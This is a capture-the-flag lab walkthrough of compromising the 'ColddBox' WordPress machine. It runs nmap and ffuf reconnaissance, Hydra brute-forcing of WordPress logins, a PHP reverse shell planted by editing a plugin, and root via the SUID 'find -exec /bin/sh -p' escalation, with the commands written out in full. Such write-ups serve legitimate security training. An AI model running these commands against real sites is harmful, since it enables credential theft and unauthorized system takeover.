

## Pre-Engagement

### Lab Description

In this lab, you will enumerate a WordPress site, uncover user credentials through brute-forcing, and gain initial access using a PHP reverse shell. You will escalate privileges by exploiting an SUID binary to obtain root access.

### Learning Objectives

**After completion of this lab, learners will be able to:**
- Discover hidden directories and enumerate the WordPress site for user accounts.
- Use brute force techniques to crack credentials for WordPress users.
- Gain a reverse shell by injecting malicious code into the WordPress theme files.
- Enumerate for SUID binaries and leverage find to escalate privileges.
- Obtain root access and capture the flag.

## Reconnaissance

### Active Recon

Nmap Scan - 

```shell
nmap -sCV -p- 192.168.242.239
```

```
Nmap scan report for 192.168.242.239
Host is up (0.16s latency).
Not shown: 999 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)

4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:54:f4:98:fc:19:71:9c:2d:3f:e9:ef:1c:df:19:ae (RSA)
|   256 d0:d7:87:fc:7d:b1:c5:f4:5f:c0:c6:8d:62:95:62:85 (ECDSA)
|_  256 05:e4:ef:18:8d:9e:95:8d:b3:9d:1d:00:52:9f:0f:0c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ffuf Scan - 

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://192.168.242.239/FUZZ
```

```
hidden
wp-admin
wp-content
wp-includes
```

"http://192.168.242.239/hidden/" - 

```
# U-R-G-E-N-T

## C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

Hydra (usernames enumeration) - 

```shell
hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p password 192.168.242.239 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
```

Result - 

```
[80][http-post-form] host: 192.168.242.239   login: philip   password: password
[80][http-post-form] host: 192.168.242.239   login: hugo   password: password
```

Usernames - 

```
C0ldd
Hugo
Philip
```

Hydra (password enumeration) - 

```shell
hydra -l C0ldd -P /usr/share/wordlists/rockyou.txt -u 192.168.242.239 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=is incorrect"
```

Result - 

```
[80][http-post-form] host: 192.168.242.239   login: C0ldd   password: <REDACTED>
```

## Exploitation

Plugins -> Edited an installed plugin to get a php reverse shell.

Logged in as - `www-data@lab-pg-ubuntu16-coldboxeasy-242-192:/$`.

```shell
$ cat /etc/passwd | grep home

c0ldd:x:1000:1000:c0ldd,,,:/home/c0ldd:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash

```

```shell
www-data@lab-pg-ubuntu16-coldboxeasy-242-192:/home/c0ldd$ ls -la

-rw-r--r-- 1 root  root    33 Oct 21 09:03 local.txt
-rw-rw---- 1 c0ldd c0ldd   53 Sep 24  2020 user.txt

```

## Post-Exploitation

SUID - 

```shell
$ find / -type f -perm -4000 2>/dev/null

/usr/bin/find
```

Escalation - 

```shell
$ /usr/bin/find . -exec /bin/sh -p \; -quit
```

## Conclusion

